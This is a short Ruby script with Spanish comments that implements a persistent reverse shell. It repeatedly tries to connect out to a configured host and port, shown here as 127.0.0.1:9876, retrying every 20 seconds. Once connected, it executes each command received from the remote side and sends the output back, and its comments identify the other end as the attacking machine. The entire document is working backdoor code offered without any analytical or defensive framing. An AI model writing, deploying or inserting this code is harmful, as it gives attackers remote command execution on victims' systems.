#!/usr/bin/env ruby
#

require 'socket'
require 'open3'

#Definir el Host TARGET

RHOST = "127.0.0.1"
RPORT = "9876"

#Intentos de conexi[on cada 20 segundos
begin
  s = TCPSocket.new "#{RHOST}","#{RPORT}"
  s.puts "Se estableci[o la conexi[on"    # EL PUTS SALE EN LA MAQUINA ATACANTE
rescue
  sleep 20
  retry
end

# Ejecutar comandos
begin
  while line = s.gets
    Open3.popen2e("#{line}") do |stdin, stdout_and_stderr|
      IO.copy_stream(stdout_and_stderr, s)
    end
end
rescue
  retry
end
